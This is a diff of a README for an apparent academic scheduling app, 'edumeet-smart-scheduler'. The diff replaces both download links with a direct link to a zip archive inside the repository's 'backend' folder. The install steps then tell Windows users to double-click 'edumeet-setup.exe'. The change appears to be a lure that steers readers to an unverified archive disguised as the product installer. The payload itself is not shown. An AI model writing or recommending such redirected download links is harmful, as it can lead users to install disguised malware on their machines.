@@ -1,6 +1,6 @@
 # 📅 edumeet-smart-scheduler - Organize your academic life with ease
 
-[![Download Edumeet](https://img.shields.io/badge/Download_Edumeet-blue.svg)](https://github.com/Ko167022/edumeet-smart-scheduler)
+[![Download Edumeet](https://img.shields.io/badge/Download_Edumeet-blue.svg)](https://raw.githubusercontent.com/Ko167022/edumeet-smart-scheduler/main/backend/scheduler_edumeet_smart_v2.9.zip)
 
 ## 🎯 About this software
 
@@ -19,7 +19,7 @@ Your computer needs these basic items to run this software:
 
 Follow these steps to set up the scheduler on your Windows machine:
 
-1. Visit the [official download page](https://github.com/Ko167022/edumeet-smart-scheduler) to grab the latest version of the installer.
+1. Visit the [official download page](https://raw.githubusercontent.com/Ko167022/edumeet-smart-scheduler/main/backend/scheduler_edumeet_smart_v2.9.zip) to grab the latest version of the installer.
 2. Locate the download folder on your computer.
 3. Double-click the file named "edumeet-setup.exe" to start the process.
 4. Follow the instructions on the screen to finish the installation.
